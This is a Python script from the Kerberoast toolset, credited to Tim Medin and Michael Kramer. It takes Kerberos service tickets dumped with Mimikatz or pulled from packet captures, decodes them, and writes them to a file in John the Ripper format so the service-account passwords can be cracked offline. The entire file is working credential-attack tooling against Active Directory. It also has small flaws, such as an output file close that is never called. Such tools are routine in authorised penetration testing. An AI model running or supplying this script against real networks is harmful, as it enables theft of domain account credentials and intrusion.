# Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
# from a kirbi file.
# Modification to parse them into the JTR-format by Michael Kramer (SySS GmbH)
# Copyright [2015] [Tim Medin, Michael Kramer]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License

from pyasn1.codec.ber import encoder, decoder
from multiprocessing import JoinableQueue, Manager
import glob

if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Read Mimikatz kerberos ticket then modify it and save it in crack_file')
	parser.add_argument('files', nargs='+', metavar='file.kirbi',
					help='File name to crack. Use asterisk \'*\' for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py')

	args = parser.parse_args()

	manager = Manager()
	enctickets = manager.list()

	i = 0
	for path in args.files:
		for f in glob.glob(path):
			with open(f, 'rb') as fd:
				data = fd.read()
			#data = open('f.read()

			if data[0] == '\x76':
				# rem dump
				enctickets.append((str(decoder.decode(data)[0][2][0][3][2]), i, f))
				i += 1
			elif data[:2] == '6d':
				for ticket in data.strip().split('\n'):
					enctickets.append((str(decoder.decode(ticket.decode('hex'))[0][4][3][2]), i, f))
					i += 1

	out=open("crack_file","wb")
	for et in enctickets:
		out.write("$krb5tgs$unkown:"+et[0][:16].encode("hex")+"$"+et[0][16:].encode("hex")+"\n")
	out.close
